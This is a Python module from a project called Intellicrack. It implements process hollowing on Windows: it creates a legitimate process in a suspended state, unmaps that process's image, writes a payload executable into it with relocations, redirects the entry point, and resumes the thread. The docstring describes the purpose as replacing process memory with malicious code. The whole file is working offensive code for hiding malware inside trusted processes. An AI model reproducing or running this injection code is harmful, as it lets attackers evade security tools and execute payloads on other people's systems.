"""
Process Hollowing implementation for advanced code injection

Copyright (C) 2025 Zachary Flint

This file is part of Intellicrack.

Intellicrack is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Intellicrack is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Intellicrack.  If not, see <https://www.gnu.org/licenses/>.
"""

import ctypes
import struct
from typing import Any, Optional

from ...utils.logger import get_logger
from ...utils.windows_common import get_windows_kernel32, get_windows_ntdll, is_windows_available

logger = get_logger(__name__)

# Check Windows availability and pefile
if is_windows_available():
    try:
        import pefile
        AVAILABLE = True
    except ImportError:
        AVAILABLE = False
        pefile = None
else:
    AVAILABLE = False
    pefile = None

class ProcessHollowing:
    """Process Hollowing - replace process memory with malicious code"""

    def __init__(self):
        if not AVAILABLE:
            raise RuntimeError("Process hollowing requires Windows and pefile")

        self.kernel32 = get_windows_kernel32()
        self.ntdll = get_windows_ntdll()
        if not self.kernel32 or not self.ntdll:
            raise RuntimeError("Failed to load required Windows libraries")

        # Process creation flags
        self.CREATE_SUSPENDED = 0x00000004
        self.CREATE_NO_WINDOW = 0x08000000

        # Memory constants
        self.MEM_COMMIT = 0x1000
        self.MEM_RESERVE = 0x2000
        self.PAGE_EXECUTE_READWRITE = 0x40

    def hollow_process(self, target_exe: str, payload_path: str) -> bool:
        """
        Perform process hollowing
        
        Args:
            target_exe: Path to legitimate executable to hollow
            payload_path: Path to payload executable
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Read payload
            with open(payload_path, 'rb') as f:
                payload_data = f.read()

            # Parse payload PE
            payload_pe = pefile.PE(data=payload_data)

            # Create suspended process
            process_info = self._create_suspended_process(target_exe)
            if not process_info:
                logger.error("Failed to create suspended process")
                return False

            try:
                # Get process context
                context = self._get_thread_context(process_info['thread_handle'])
                if not context:
                    logger.error("Failed to get thread context")
                    return False

                # Get image base from PEB
                peb_addr = self._get_peb_address_from_context(context)
                image_base = self._read_image_base_from_peb(
                    process_info['process_handle'],
                    peb_addr
                )

                if not image_base:
                    logger.error("Failed to get image base")
                    return False

                logger.info(f"Target image base: {hex(image_base)}")

                # Unmap original executable
                if not self._unmap_view_of_section(process_info['process_handle'], image_base):
                    logger.warning("Failed to unmap original section")

                # Allocate memory for payload
                payload_base = payload_pe.OPTIONAL_HEADER.ImageBase
                payload_size = payload_pe.OPTIONAL_HEADER.SizeOfImage

                allocated_base = self._allocate_memory(
                    process_info['process_handle'],
                    payload_base,
                    payload_size
                )

                if not allocated_base:
                    # Try alternative address
                    allocated_base = self._allocate_memory(
                        process_info['process_handle'],
                        image_base,
                        payload_size
                    )

                if not allocated_base:
                    logger.error("Failed to allocate memory for payload")
                    return False

                logger.info(f"Allocated memory at: {hex(allocated_base)}")

                # Write payload headers
                if not self._write_headers(
                    process_info['process_handle'],
                    allocated_base,
                    payload_data,
                    payload_pe
                ):
                    logger.error("Failed to write headers")
                    return False

                # Write payload sections
                if not self._write_sections(
                    process_info['process_handle'],
                    allocated_base,
                    payload_data,
                    payload_pe
                ):
                    logger.error("Failed to write sections")
                    return False

                # Process relocations if needed
                if allocated_base != payload_base:
                    if not self._process_relocations(
                        process_info['process_handle'],
                        allocated_base,
                        payload_pe
                    ):
                        logger.error("Failed to process relocations")
                        return False

                # Update entry point in context
                new_entry_point = allocated_base + payload_pe.OPTIONAL_HEADER.AddressOfEntryPoint

                if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                    context.Rcx = new_entry_point
                else:  # 32-bit
                    context.Eax = new_entry_point

                # Update image base in PEB
                self._write_image_base_to_peb(
                    process_info['process_handle'],
                    peb_addr,
                    allocated_base
                )

                # Set thread context
                if not self._set_thread_context(process_info['thread_handle'], context):
                    logger.error("Failed to set thread context")
                    return False

                # Resume thread
                self.kernel32.ResumeThread(process_info['thread_handle'])

                logger.info("Process hollowing successful")
                return True

            finally:
                # Clean up handles
                self.kernel32.CloseHandle(process_info['thread_handle'])
                self.kernel32.CloseHandle(process_info['process_handle'])

        except Exception as e:
            logger.error(f"Process hollowing failed: {e}")
            return False

    def _create_suspended_process(self, exe_path: str) -> Optional[dict]:
        """Create a process in suspended state"""
        from ...utils.windows_structures import WindowsProcessStructures
        structures = WindowsProcessStructures()
        return structures.create_suspended_process(exe_path)

    def _get_thread_context(self, thread_handle: int) -> Optional[Any]:
        """Get thread context"""
        from ...utils.windows_structures import WindowsContext
        context_helper = WindowsContext()
        return context_helper.get_thread_context(thread_handle)

    def _set_thread_context(self, thread_handle: int, context: Any) -> bool:
        """Set thread context"""
        from ...utils.windows_structures import WindowsContext
        context_helper = WindowsContext()
        return context_helper.set_thread_context(thread_handle, context)

    def _get_peb_address_from_context(self, context: Any) -> int:
        """Get PEB address from thread context"""
        try:
            if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                # PEB is at GS:[0x60]
                return context.Rdx  # RDX contains PEB on process start
            else:  # 32-bit
                # PEB is at FS:[0x30]
                return context.Ebx  # EBX contains PEB on process start
        except (AttributeError, OSError, Exception):
            return 0

    def _read_image_base_from_peb(self, process_handle: int, peb_addr: int) -> int:
        """Read image base from PEB"""
        try:
            if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                image_base_offset = 0x10
            else:  # 32-bit
                image_base_offset = 0x08

            image_base = ctypes.c_void_p(0)
            bytes_read = ctypes.c_size_t(0)

            success = self.kernel32.ReadProcessMemory(
                process_handle,
                peb_addr + image_base_offset,
                ctypes.byref(image_base),
                ctypes.sizeof(image_base),
                ctypes.byref(bytes_read)
            )

            if success:
                return image_base.value
            return 0

        except Exception as e:
            logger.error(f"Failed to read image base: {e}")
            return 0

    def _write_image_base_to_peb(self, process_handle: int, peb_addr: int,
                                new_base: int) -> bool:
        """Write new image base to PEB"""
        try:
            if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
                image_base_offset = 0x10
            else:  # 32-bit
                image_base_offset = 0x08

            new_base_ptr = ctypes.c_void_p(new_base)
            bytes_written = ctypes.c_size_t(0)

            success = self.kernel32.WriteProcessMemory(
                process_handle,
                peb_addr + image_base_offset,
                ctypes.byref(new_base_ptr),
                ctypes.sizeof(new_base_ptr),
                ctypes.byref(bytes_written)
            )

            return success

        except Exception as e:
            logger.error(f"Failed to write image base: {e}")
            return False

    def _unmap_view_of_section(self, process_handle: int, base_addr: int) -> bool:
        """Unmap a section from process"""
        try:
            # NtUnmapViewOfSection
            status = self.ntdll.NtUnmapViewOfSection(process_handle, base_addr)
            if status == 0:
                logger.info(f"Unmapped section at {hex(base_addr)}")
                return True
            else:
                logger.warning(f"NtUnmapViewOfSection failed: 0x{status:X}")
                return False
        except Exception as e:
            logger.error(f"Failed to unmap section: {e}")
            return False

    def _allocate_memory(self, process_handle: int, preferred_addr: int,
                        size: int) -> int:
        """Allocate memory in target process"""
        try:
            allocated = self.kernel32.VirtualAllocEx(
                process_handle,
                preferred_addr,
                size,
                self.MEM_COMMIT | self.MEM_RESERVE,
                self.PAGE_EXECUTE_READWRITE
            )

            if not allocated:
                # Try without preferred address
                allocated = self.kernel32.VirtualAllocEx(
                    process_handle,
                    None,
                    size,
                    self.MEM_COMMIT | self.MEM_RESERVE,
                    self.PAGE_EXECUTE_READWRITE
                )

            return allocated

        except Exception as e:
            logger.error(f"Failed to allocate memory: {e}")
            return 0

    def _write_headers(self, process_handle: int, base_addr: int,
                      payload_data: bytes, payload_pe: Any) -> bool:
        """Write PE headers to target process"""
        try:
            headers_size = payload_pe.OPTIONAL_HEADER.SizeOfHeaders
            bytes_written = ctypes.c_size_t(0)

            success = self.kernel32.WriteProcessMemory(
                process_handle,
                base_addr,
                payload_data[:headers_size],
                headers_size,
                ctypes.byref(bytes_written)
            )

            return success and bytes_written.value == headers_size

        except Exception as e:
            logger.error(f"Failed to write headers: {e}")
            return False

    def _write_sections(self, process_handle: int, base_addr: int,
                       payload_data: bytes, payload_pe: Any) -> bool:
        """Write PE sections to target process"""
        try:
            for section in payload_pe.sections:
                section_addr = base_addr + section.VirtualAddress
                section_data = payload_data[
                    section.PointerToRawData:
                    section.PointerToRawData + section.SizeOfRawData
                ]

                if section_data:
                    bytes_written = ctypes.c_size_t(0)
                    success = self.kernel32.WriteProcessMemory(
                        process_handle,
                        section_addr,
                        section_data,
                        len(section_data),
                        ctypes.byref(bytes_written)
                    )

                    if not success:
                        logger.error(f"Failed to write section {section.Name}")
                        return False

            return True

        except Exception as e:
            logger.error(f"Failed to write sections: {e}")
            return False

    def _process_relocations(self, process_handle: int, new_base: int,
                           payload_pe: Any) -> bool:
        """Process PE relocations for new base address"""
        try:
            if not hasattr(payload_pe, 'DIRECTORY_ENTRY_BASERELOC'):
                return True  # No relocations needed

            delta = new_base - payload_pe.OPTIONAL_HEADER.ImageBase

            for reloc in payload_pe.DIRECTORY_ENTRY_BASERELOC:
                for entry in reloc.entries:
                    if entry.type == 0:  # IMAGE_REL_BASED_ABSOLUTE
                        continue

                    reloc_addr = new_base + reloc.VirtualAddress + entry.rva

                    # Read current value
                    if entry.type == 3:  # IMAGE_REL_BASED_HIGHLOW
                        current = ctypes.c_ulong(0)
                        size = 4
                    elif entry.type == 10:  # IMAGE_REL_BASED_DIR64
                        current = ctypes.c_ulonglong(0)
                        size = 8
                    else:
                        continue

                    bytes_read = ctypes.c_size_t(0)
                    self.kernel32.ReadProcessMemory(
                        process_handle,
                        reloc_addr,
                        ctypes.byref(current),
                        size,
                        ctypes.byref(bytes_read)
                    )

                    # Apply relocation
                    new_value = current.value + delta
                    new_bytes = struct.pack('<Q' if size == 8 else '<I', new_value)

                    bytes_written = ctypes.c_size_t(0)
                    self.kernel32.WriteProcessMemory(
                        process_handle,
                        reloc_addr,
                        new_bytes[:size],
                        size,
                        ctypes.byref(bytes_written)
                    )

            return True

        except Exception as e:
            logger.error(f"Failed to process relocations: {e}")
            return False


def perform_process_hollowing(target_exe: str, payload_exe: str) -> bool:
    """
    Convenience function to perform process hollowing
    
    Args:
        target_exe: Path to legitimate executable
        payload_exe: Path to payload executable
        
    Returns:
        True if successful, False otherwise
    """
    if not AVAILABLE:
        logger.error("Process hollowing not available on this platform")
        return False

    try:
        hollower = ProcessHollowing()
        return hollower.hollow_process(target_exe, payload_exe)
    except Exception as e:
        logger.error(f"Process hollowing failed: {e}")
        return False
